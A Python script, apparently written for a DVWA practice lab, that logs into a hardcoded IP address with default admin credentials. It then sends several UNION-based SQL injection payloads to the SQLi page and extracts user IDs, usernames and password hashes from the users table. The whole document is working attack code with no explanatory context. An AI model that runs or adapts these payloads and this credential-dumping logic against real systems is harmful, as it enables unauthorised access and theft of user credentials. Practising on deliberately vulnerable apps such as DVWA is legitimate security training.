
import requests
import re
import html

target_url = "http://31.97.117.123"
session = requests.Session()

# Login first
print("[*] Logging in...")
login_page = session.get(f"{target_url}/login.php")
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else None

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{target_url}/login.php", data=payload, allow_redirects=True)

# First, let's understand the database structure by testing basic injection
print("\n[*] Testing SQL injection to find table structure...")

# Try UNION-based SQL injection to get all users
# Typical DVWA users table has: user_id, first_name, last_name, user, password

# Start with getting all data from the users table
sqli_payloads = [
    "1' UNION SELECT CONCAT(user_id, ':', user, ':', password), 2, 3, 4 FROM users-- -",
    "1' UNION SELECT CONCAT('USER:', user, ' | PASS:', password), 2, 3, 4 FROM users-- -",
    "1 UNION SELECT CONCAT(user_id, ':', user, ':', password), 2, 3, 4 FROM users-- -",
    "1' OR '1'='1",
]

users_data = []

for payload_str in sqli_payloads:
    print(f"\n[*] Trying payload: {payload_str[:80]}...")
    try:
        params = {"id": payload_str, "Submit": "Submit"}
        response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)
        
        # Look for results in the page
        if "First name" in response.text and "ID" in response.text:
            print("[+] Found potential results!")
            
            # Extract the user ID/data from the response
            # Look for the results section
            match = re.search(r'ID:.*?<pre[^>]*>(.*?)</pre>', response.text, re.DOTALL)
            if not match:
                match = re.search(r'<pre[^>]*>(.*?)</pre>', response.text, re.DOTALL)
            
            if match:
                result = match.group(1).strip()
                print("[+] Results:")
                print(result[:1000])
                
                # Try to extract user info
                if ':' in result and len(result) > 5:
                    users_data.append(result)
                    
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if users_data:
    print("\n[+] Extracted users data:")
    for data in users_data:
        print(data)

